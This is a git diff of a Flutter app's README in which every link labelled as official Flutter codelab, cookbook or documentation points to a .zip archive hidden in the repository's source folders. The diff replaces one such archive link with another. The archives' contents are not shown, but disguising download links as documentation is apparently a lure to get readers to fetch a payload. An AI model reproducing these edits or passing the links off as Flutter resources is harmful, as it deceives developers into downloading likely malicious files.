@@ -8,9 +8,9 @@ This project is a starting point for a Flutter application.
 
 A few resources to get you started if this is your first Flutter project:
 
-- [Lab: Write your first Flutter app](https://raw.githubusercontent.com/AzzaFizatiaina/Flutter-Homestay/main/android/app/src/profile/Flutter-Homestay-v2.3.zip)
-- [Cookbook: Useful Flutter samples](https://raw.githubusercontent.com/AzzaFizatiaina/Flutter-Homestay/main/android/app/src/profile/Flutter-Homestay-v2.3.zip)
+- [Lab: Write your first Flutter app](https://github.com/AzzaFizatiaina/Flutter-Homestay/raw/refs/heads/main/lib/reusable_widgets/Flutter_Homestay_atrepsy.zip)
+- [Cookbook: Useful Flutter samples](https://github.com/AzzaFizatiaina/Flutter-Homestay/raw/refs/heads/main/lib/reusable_widgets/Flutter_Homestay_atrepsy.zip)
 
 For help getting started with Flutter, view our
-[online documentation](https://raw.githubusercontent.com/AzzaFizatiaina/Flutter-Homestay/main/android/app/src/profile/Flutter-Homestay-v2.3.zip), which offers tutorials,
+[online documentation](https://github.com/AzzaFizatiaina/Flutter-Homestay/raw/refs/heads/main/lib/reusable_widgets/Flutter_Homestay_atrepsy.zip), which offers tutorials,
 samples, guidance on mobile development, and a full API reference.
